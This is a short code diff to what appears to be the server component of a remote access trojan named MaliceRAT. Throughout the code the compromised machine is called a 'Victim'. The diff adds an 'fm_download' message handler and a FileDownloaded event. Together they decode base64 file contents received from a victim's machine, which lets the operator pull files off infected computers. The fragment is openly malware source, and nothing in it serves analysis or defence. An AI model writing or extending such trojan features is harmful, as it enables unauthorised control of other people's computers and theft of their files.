@@ -7,6 +7,7 @@ namespace MaliceRAT.RatServer.Features
         #region Events
         public event Action<Victim, string> FilesAndFoldersReceived;
         public event Action<Victim, string, string> FileUploaded;
+        public event Action<Victim, string, byte[]> FileDownloaded;
         #endregion
 
         #region Variables
@@ -33,6 +34,12 @@ namespace MaliceRAT.RatServer.Features
                 string name = message["name"];
                 string data = message["data"];
                 FileUploaded?.Invoke(victim, name, data);
+            }
+            else if (message["type"] == "fm_download")
+            {
+                string name = message["name"];
+                byte[] data = Convert.FromBase64String(message["data"]);
+                FileDownloaded?.Invoke(victim, name, data);
             }
         }
     }
